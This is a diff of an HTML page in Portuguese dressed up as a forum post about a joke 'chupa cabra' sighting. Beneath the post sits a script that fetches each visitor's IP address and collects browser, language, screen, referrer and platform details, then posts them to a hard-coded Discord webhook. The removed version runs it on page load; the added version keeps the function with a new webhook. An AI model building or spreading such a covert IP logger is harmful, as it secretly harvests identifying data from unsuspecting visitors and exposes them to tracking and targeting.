@@ -1,84 +1,185 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Post by confetti - PillForum</title>
-</head>
-<body onload="enviarMensagem()">
-    <style>
-      body {
-      font-family: Arial, sans-serif;
+  <title>Redpill Forum - Post By confetti</title>
+  <style>
+    body {
       background-color: #1C1C1C;
-    }
-    
-    .forum-post {
-      border: 1px solid #4F4F4F;
+      font-family: Arial, sans-serif;
+      margin: 0;
       padding: 20px;
+      color: #EE7600;
+    }
+
+    .titulo {
+      text-align: center;
       margin-bottom: 20px;
     }
-    
-    .post-header {
-      font-size: 18px;
-      font-weight: bold;
-      margin-bottom: 10px;
+
+    .container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center; /* Modificado para centralizar as postagens */
     }
-    
-    .post-content {
-      margin-bottom: 10px;
+
+    .grupo-postagens {
+      width: calc(33.33% - 20px);
+      margin-bottom: 20px;
     }
-    
-    .post-footer {
-      font-size: 14px;
-      color: #888;
+
+    .postagem {
+      background-color: #1C1C1C;
+      border-radius: 5px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      margin: 0 0 20px;
+      padding: 20px;
     }
-    </style>
-    
-    <div class="forum-post">
-        <div class="post-header"></div>
-        <div class="post-content">
-            <iframe width="560" height="315" src="https://www.youtube.com/embed/p-0HXwj5VAg" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
-        </div>
+
+    .postagem h2 {
+      margin-top: 0;
+    }
+
+    .postagem img,
+    .postagem video {
+      max-width: 100%;
+      height: auto;
+    }
+
+    .comentarios {
+      margin-top: 40px;
+      padding-top: 20px;
+      border-top: 1px solid #ccc;
+      text-align: center;
+    }
+
+    .comentario {
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .comentario strong {
+      display: block;
+      margin-bottom: 5px;
+      color: gray;
+    }
+
+    .usuario {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .usuario img {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      margin-right: 10px;
+    }
+    .sidebar {
+  width: 250px;
+  background-color: #1C1C1C;
+  padding: 10px;
+  position: fixed;
+  top: 0;
+  left: 0;
+  height: 100%;
+}
+
+.sidebar a {
+  display: block;
+  margin-bottom: 10px;
+  color: #000;
+  text-decoration: none;
+}
+
+.sidebar .recent-images {
+  margin-top: 20px;
+}
+
+.sidebar .recent-images img {
+  display: block;
+  width: 100%;
+  margin-bottom: 10px;
+}
+
+  </style>
+  </style>
+</head>
+<body>
+  <div class="titulo">
+    <img src="https://images.cooltext.com/5663076.gif" alt="Foto de Título">
+  </div><br><br><br>
+
+
+  <div class="container">
+    <div class="grupo-postagens">
+      <div class="postagem">
+        <h2>Chupa cabra</h2>
+        
+        <img src="https://i.pinimg.com/736x/1b/c9/6c/1bc96c623f4802f81599d0621071ea3a.jpg" alt="Foto 1">
         <div class="post-footer">
-            Posted by: confetti | Date: 03/06/2023 | Time: 13:41
+          Posted by: confetti | Date: 03/06/2023 | Time: 13:41
+      
+        <p>Homen escreve Deus com "D" minúsculo e vira chupa cabra no interior de alagoinhas.</p>
+        
+      </div>
+
+      <div class="comentario">
+        <div class="usuario">
+          <img src="https://i.pinimg.com/736x/f1/ad/aa/f1adaa0d3769b46544849b07e11610b4.jpg" alt="Foto do Usuário 3">
+          <strong>Luiz inácio lula</strong>
         </div>
+        <p>Foi meu tio, ele é do interior de Alagoinhas mas foi só trolagem do zóio</p>
+
+  <div class="comentarios">
+    
+  </div>
+  <div class="sidebar">
+   
+    <h2>Recents Posts:</h2>
+    <div class="recent-images">
+      <a href="link_imagem1.html"><img src="https://media.tenor.com/yJnjYGAMF-8AAAAC/dead-chat-dead-chat-xd.gif" alt="Imagem 1"></a>
+      <a href="link_imagem2.html"><img src="https://media.tenor.com/hPsArdm2VYQAAAAS/pasen-cepesito-xd.gif" alt="Imagem 2"></a>
+      <a href="link_imagem3.html"><img src="https://i.pinimg.com/564x/5c/ae/bc/5caebc1e8fe82acb9a28055d0a0bdefc.jpg" alt="Imagem 3"></a>
     </div>
-  
-    <script>
-        function enviarMensagem() {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipAddress = data.ip;
-                    const webhookUrl = 'https://discordapp.com/api/webhooks/1125237083431247902/SrMM4db_BfN63dydIWhfS6w-XMekZMxOTGAHn0z3iGLcKPnz_OFauB7Zq5gGlQs2ttvU'; // Substitua pela URL correta
-                    
-                    const userAgent = navigator.userAgent;
-                    const language = navigator.language;
-                    const screenWidth = window.screen.width;
-                    const screenHeight = window.screen.height;
-                    const referrer = document.referrer;
-                    const operatingSystem = navigator.platform;
-                    
-                    const message = `@everyone Nova visita ao site! \nIP: ${ipAddress} \nUser-Agent: ${userAgent} \nLinguagem: ${language} \nScreen Resolução: ${screenWidth}x${screenHeight} \nReferrer: ${referrer} \nSistema Operacional: ${operatingSystem}`;
-                    
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            content: message,
-                        }),
-                    })
-                    .then(response => {
-                        console.log('Mensagem enviada com sucesso!');
-                    })
-                    .catch(error => {
-                        console.error('Erro ao enviar a mensagem:', error);
-                    });
+  </div>
+  <script>
+    function enviarMensagem() {
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                const webhookUrl = 'https://discordapp.com/api/webhooks/1125849929890402437/xHIrtwxCP_aDWwuivyFGAH81iHdZGhMDPg3vrCXZrDobhOkjSEJ0bNztpejZR14rNs_b';
+                
+                const userAgent = navigator.userAgent;
+                const language = navigator.language;
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                const referrer = document.referrer;
+                const operatingSystem = navigator.platform;
+                
+                const message = `@everyone Nova visita ao site! \nIP: ${ipAddress} \nUser-Agent: ${userAgent} \nLinguagem: ${language} \nScreen Resolução: ${screenWidth}x${screenHeight} \nReferrer: ${referrer} \nSistema Operacional: ${operatingSystem}`;
+                
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: message,
+                    }),
+                })
+                .then(response => {
+                    console.log('Mensagem enviada com sucesso!');
                 })
                 .catch(error => {
-                    console.error('Erro ao obter o endereço IP:', error);
+                    console.error('Erro ao enviar a mensagem:', error);
                 });
-        }
-    </script>
+            })
+            .catch(error => {
+                console.error('Erro ao obter o endereço IP:', error);
+            });
+    }
+</script>
 </body>
 </html>
